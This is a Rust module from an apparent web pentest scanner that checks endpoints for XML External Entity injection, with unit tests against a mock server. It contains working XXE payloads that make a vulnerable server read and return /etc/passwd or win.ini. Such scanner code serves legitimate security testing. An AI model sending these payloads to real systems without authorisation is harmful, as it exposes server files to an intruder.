//! xxe — XML External Entity injection (in-band file read).
//!
//! Only meaningful when the endpoint parses an XML request body. Sends a
//! benign external-entity document pointing at the server's own
//! `/etc/passwd` and checks whether the entity is expanded into the
//! response. No billion-laughs / DoS. Port of `checks/xxe.py`.

use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use std::sync::LazyLock;

pub const NAME: &str = "xxe";

static PASSWD_RE: LazyLock<regex::Regex> = LazyLock::new(|| regex::Regex::new(r"root:.*:0:0:").unwrap());

const XXE_DOC: &str = "<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<data>&xxe;</data>";
const XXE_WIN: &str = "<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>\n<data>&xxe;</data>";

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, _opts: &Opts) -> Vec<Finding> {
    let mut out = Vec::new();

    for (doc, label) in [(XXE_DOC, "file:///etc/passwd"), (XXE_WIN, "win.ini")] {
        let req = HttpRequest::post().raw_body(doc.as_bytes().to_vec()).header("Content-Type", "application/xml");
        let Ok(r) = client.request(req).await else { continue };

        if PASSWD_RE.is_match(&r.body) {
            out.push(
                Finding::new(NAME, Severity::Critical, "XXE — external entity file read", format!("external entity {label} expanded into response"))
                    .with_evidence("root:...:0:0:"),
            );
            return out;
        }
        let lower = r.body.to_lowercase();
        if lower.contains("[fonts]") || lower.contains("[extensions]") {
            out.push(
                Finding::new(NAME, Severity::Critical, "XXE — external entity file read (Windows)", format!("external entity {label} expanded into response"))
                    .with_evidence(r.body.chars().take(80).collect::<String>()),
            );
            return out;
        }
    }
    // If the endpoint rejects XML entirely we simply report nothing actionable.
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;

    fn fast_client(base_url: String) -> HttpClient {
        HttpClient::new(base_url, HttpClientConfig { delay: std::time::Duration::from_millis(0), ..HttpClientConfig::default() })
    }

    #[tokio::test]
    async fn detects_unix_passwd_entity_expansion() {
        let base = scripted_server(|req, _| {
            if req.body.contains("file:///etc/passwd") {
                ScriptedResponse::ok("<data>root:x:0:0:root:/root:/bin/bash</data>")
            } else {
                ScriptedResponse::ok("<data></data>")
            }
        })
        .await;
        let client = fast_client(base);

        let findings = run_impl(&client, &Opts::default()).await;

        assert!(findings.iter().any(|f| f.title == "XXE — external entity file read"));
    }

    #[tokio::test]
    async fn detects_windows_ini_entity_expansion() {
        let base = scripted_server(|req, _| {
            if req.body.contains("win.ini") {
                ScriptedResponse::ok("<data>[fonts]\r\n</data>")
            } else {
                ScriptedResponse::ok("<data></data>")
            }
        })
        .await;
        let client = fast_client(base);

        let findings = run_impl(&client, &Opts::default()).await;

        assert!(findings.iter().any(|f| f.title == "XXE — external entity file read (Windows)"));
    }

    #[tokio::test]
    async fn no_findings_when_entities_are_not_expanded() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("<data>rejected</data>")).await;
        let client = fast_client(base);

        let findings = run_impl(&client, &Opts::default()).await;

        assert!(findings.is_empty());
    }
}
